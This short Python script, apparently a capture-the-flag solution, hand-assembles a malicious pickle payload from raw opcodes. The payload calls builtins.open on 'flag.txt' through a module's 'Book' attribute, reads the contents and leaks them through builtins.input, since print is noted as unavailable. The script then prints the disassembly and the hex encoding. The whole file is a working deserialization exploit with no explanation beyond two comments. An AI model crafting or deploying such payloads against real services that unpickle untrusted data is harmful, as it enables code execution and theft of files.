from pickle import *
from pickletools import dis

p = b""

p += PROTO
p += b'\x05'

p += GLOBAL
p += b'data\n'
p += b'self\n'

p += NONE

p += MARK

p += STRING
p += b'"Book"\n'

p += GLOBAL
p += b'builtins\n'
p += b'open\n'
p += STRING
p += b'"flag.txt"\n'
p += TUPLE1
p += REDUCE

p += DICT

p += TUPLE2
p += BUILD

p += POP

p += GLOBAL
p += b'data\n'
p += b'read\n'
p += EMPTY_TUPLE
p += REDUCE
p += MEMOIZE  # memo[0] = flag
p += POP

p += GLOBAL
p += b'builtins\n'
p += b'input\n'  # no access to print so we use input instead
p += GET
p += b'0\n'
p += TUPLE1
p += REDUCE

p += STOP

dis(p)
print("="*50)
print(p.hex())
